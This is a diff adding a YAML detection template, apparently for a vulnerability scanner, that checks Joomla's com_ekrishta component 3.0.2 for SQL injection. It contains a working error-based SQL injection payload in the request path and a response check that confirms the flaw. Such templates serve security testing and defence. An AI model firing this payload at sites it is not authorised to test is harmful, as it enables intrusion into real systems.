@@ -1,0 +1,13 @@
+name: poc-yaml-joomla-component-ekrishta-sql
+set:
+  r1: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: /index.php?option=com_ekrishta&view=user_detail&cid=711 AND EXTRACTVALUE(22,CONCAT(0x7e,md5({{r1}}),0x7e))-- X
+    expression: |
+      response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+detail:
+  author: 南方有梦(http://github.com/hackgov)
+  Affected Version: "3.0.2"
+  links:
+    - https://www.exploit-db.com/exploits/44869
